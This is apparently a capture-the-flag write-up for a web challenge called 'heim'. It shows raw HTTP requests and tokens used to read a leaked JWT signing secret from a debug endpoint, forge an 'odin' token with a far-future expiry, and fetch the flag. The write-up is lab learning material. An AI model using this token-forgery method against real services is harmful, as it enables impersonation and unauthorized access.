# heim

>Modern auth for the modern viking
>
>http://104.197.195.221:8081 >http://34.121.84.161:8081
>
>Created by Cobchise#6969

>## Hint
>Make sure you sniff before you sign. There are open-source tools to help with both

## Cookie
`session: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNjk4MDE4OSwianRpIjoiZTljZGU3OTYtMGVjMC00ODQ3LWJiNGItYjBhZTEzM2IyZmQxIiwibmJmIjoxNjE2OTgwMTg5LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaW5obyIsImV4cCI6MTYxNjk4MTA4OX0.cGGUUWJQwAMhBrAMaC7usGpqZZSAEA8KWkQwiSkzapo`

```
http://104.197.195.221:8081/auth?access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNjk4MjMxMywianRpIjoiMWRiZDg3MTUtMDA3Yi00MzlkLTgxMjctZTM4YWI3NDIyNjcxIiwibmJmIjoxNjE2OTgyMzEzLCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaW5obyIsImV4cCI6MTYxNjk4MzIxM30.QmtYQdGFeUMA0t1dccwm5OrdvcYGpNrDJSXBH2dB8G0&jwt_secret_key=arottenbranchwillbefoundineverytree
```

jwt_secret_key=`arottenbranchwillbefoundineverytree`


![ccf40889fe8a55c00b4c1e55a29b397b.png](:/be6cb79cb4064ed58f6fada952649dda)



```
GET / HTTP/1.1
Host: 104.197.195.221:8081
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNjk4MjMxMywianRpIjoiMWRiZDg3MTUtMDA3Yi00MzlkLTgxMjctZTM4YWI3NDIyNjcxIiwibmJmIjoxNjE2OTgyMzEzLCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaW5obyIsImV4cCI6MTYxNjk4MzIxM30.QmtYQdGFeUMA0t1dccwm5OrdvcYGpNrDJSXBH2dB8G0
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=.eJxNjslSgzAAht-FB-iETabeKqU0EYI4LE0uDsQoCaRowWmJ03c33Dz-63y_VsMYn6a3eez52Xq0-IIAP-1EJtBzZeciCVHXxmzVsNTQxgJtN6akmKp0E8IHqg4Tc8oJqqF7NzotyA3L3ksLZuPwKprz6xeUo0gd1BNVCSrzmcapky4A0BgPSX2Q2T6aiaQdLYg2iZcVPYDiKlqFlNmav8jJis8b1iUwQAbwaVg_SY0lPWG9dplbidVran9sF2h4Ko_955HExkewiedZpz8ARchvmv72Uub-kW8DxC-XwK13gxvsOSmTj--SWfc_Ouhhbg.YGEu-g.lRxVg8uOVF26Dp3ug2E3XCaAcek
Upgrade-Insecure-Requests: 1


```

Server's response
```
"msg":"ewogICAgImFwaSI6IHsKICAgICAgICAidjEiOiB7CiAgICAgICAgICAgICIvYXV0aCI6IHsKICAgICAgICAgICAgICAgICJnZXQiOiB7CiAgICAgICAgICAgICAgICAgICAgInN1bW1hcnkiOiAiRGVidWdnaW5nIG1ldGhvZCBmb3IgYXV0aG9yaXphdGlvbiBwb3N0IiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiTm9uZSIsCiAgICAgICAgICAgICAgICAgICAgInBhcmFtZXRlcnMiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJhY2Nlc3NfdG9rZW4iOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIkFjY2VzcyB0b2tlbiBmcm9tIHJlY2VudGx5IGF1dGhvcml6ZWQgVmlraW5nIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIiwKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgImp3dF9zZWNyZXRfa2V5IjogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgInJlcXVpcmVkIjogZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiAiRGVidWdnaW5nIC0gc2hvdWxkIGJlIHJlbW92ZWQgaW4gcHJvZCBIZWltIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJwb3N0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIkF1dGhvcml6ZSB5b3Vyc2VsZiBhcyBhIFZpa2luZyIsCiAgICAgICAgICAgICAgICAgICAgInNlY3VyaXR5IjogIk5vbmUiLAogICAgICAgICAgICAgICAgICAgICJwYXJhbWV0ZXJzIjogewogICAgICAgICAgICAgICAgICAgICAgICAidXNlcm5hbWUiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIllvdXIgVmlraW5nIG5hbWUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImluIjogImJvZHkiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQiOiAibXVsdGlwYXJ0L3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgIi9oZWltIjogewogICAgICAgICAgICAgICAgImdldCI6IHsKICAgICAgICAgICAgICAgICAgICAic3VtbWFyeSI6ICJMaXN0IHRoZSBlbmRwb2ludHMgYXZhaWxhYmxlIHRvIG5hbWVkIFZpa2luZ3MiLAogICAgICAgICAgICAgICAgICAgICJzZWN1cml0eSI6ICJCZWFyZXJBdXRoIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAiL2ZsYWciOiB7CiAgICAgICAgICAgICAgICAiZ2V0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIlJldHJpZXZlIHRoZSBmbGFnIiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiQmVhcmVyQXV0aCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQ=="
```

Base64 decode
```
{
    "api": {
        "v1": {
            "/auth": {
                "get": {
                    "summary": "Debugging method for authorization post",
                    "security": "None",
                    "parameters": {
                        "access_token": {
                            "required": true,
                            "description": "Access token from recently authorized Viking",
                            "in": "path",
                        },
                        "jwt_secret_key": {
                            "required": false,
                            "description": "Debugging - should be removed in prod Heim",
                            "in": "path"
                        }
                    }
                },
                "post": {
                    "summary": "Authorize yourself as a Viking",
                    "security": "None",
                    "parameters": {
                        "username": {
                            "required": true,
                            "description": "Your Viking name",
                            "in": "body",
                            "content": "multipart/x-www-form-urlencoded"
                        }
                    }
                }
            },
            "/heim": {
                "get": {
                    "summary": "List the endpoints available to named Vikings",
                    "security": "BearerAuth"
                }
            },
            "/flag": {
                "get": {
                    "summary": "Retrieve the flag",
                    "security": "BearerAuth"
                }
            }
        }
    }
}
```


## Get flag with current jwt
```
GET /flag HTTP/1.1
Host: 104.197.195.221:8081
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNjk4MjMxMywianRpIjoiMWRiZDg3MTUtMDA3Yi00MzlkLTgxMjctZTM4YWI3NDIyNjcxIiwibmJmIjoxNjE2OTgyMzEzLCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoiaW5obyIsImV4cCI6MTYxNjk4MzIxM30.QmtYQdGFeUMA0t1dccwm5OrdvcYGpNrDJSXBH2dB8G0
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=.eJxNjslSgzAAht-FB-iETabeKqU0EYI4LE0uDsQoCaRowWmJ03c33Dz-63y_VsMYn6a3eez52Xq0-IIAP-1EJtBzZeciCVHXxmzVsNTQxgJtN6akmKp0E8IHqg4Tc8oJqqF7NzotyA3L3ksLZuPwKprz6xeUo0gd1BNVCSrzmcapky4A0BgPSX2Q2T6aiaQdLYg2iZcVPYDiKlqFlNmav8jJis8b1iUwQAbwaVg_SY0lPWG9dplbidVran9sF2h4Ko_955HExkewiedZpz8ARchvmv72Uub-kW8DxC-XwK13gxvsOSmTj--SWfc_Ouhhbg.YGEu-g.lRxVg8uOVF26Dp3ug2E3XCaAcek
Upgrade-Insecure-Requests: 1


```

Server's response
```
HTTP/1.1 401 UNAUTHORIZED
Server: gunicorn/20.0.4
Date: Mon, 29 Mar 2021 01:54:01 GMT
Connection: close
Content-Type: application/json
Content-Length: 77

{
  "msg": "You are not worthy. Only the AllFather Odin may view the flag"
}

```

## Changing user for odin
[odinjwt](odinjwt.png)

```
arottenbranchwillbefoundineverytree
```

## Get flag as odin
```
GET /flag HTTP/1.1
Host: 104.197.195.221:8081
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYxNjk4MjMxMywianRpIjoiMWRiZDg3MTUtMDA3Yi00MzlkLTgxMjctZTM4YWI3NDIyNjcxIiwibmJmIjoxNjE2OTgyMzEzLCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoib2RpbiIsImV4cCI6MjYxNjk4MzIxM30.d431hMtPHQQUQp9KkbnWff3sLLeVadXHVPbEmwEdT2s
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=.eJxNjslSgzAAht-FB-iETabeKqU0EYI4LE0uDsQoCaRowWmJ03c33Dz-63y_VsMYn6a3eez52Xq0-IIAP-1EJtBzZeciCVHXxmzVsNTQxgJtN6akmKp0E8IHqg4Tc8oJqqF7NzotyA3L3ksLZuPwKprz6xeUo0gd1BNVCSrzmcapky4A0BgPSX2Q2T6aiaQdLYg2iZcVPYDiKlqFlNmav8jJis8b1iUwQAbwaVg_SY0lPWG9dplbidVran9sF2h4Ko_955HExkewiedZpz8ARchvmv72Uub-kW8DxC-XwK13gxvsOSmTj--SWfc_Ouhhbg.YGEu-g.lRxVg8uOVF26Dp3ug2E3XCaAcek
Upgrade-Insecure-Requests: 1
```

Server's response
```
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Mon, 29 Mar 2021 01:55:15 GMT
Connection: close
Content-Type: application/json
Content-Length: 51

{
  "flag": "UMASS{liveheim_laughheim_loveheim}"
}

```
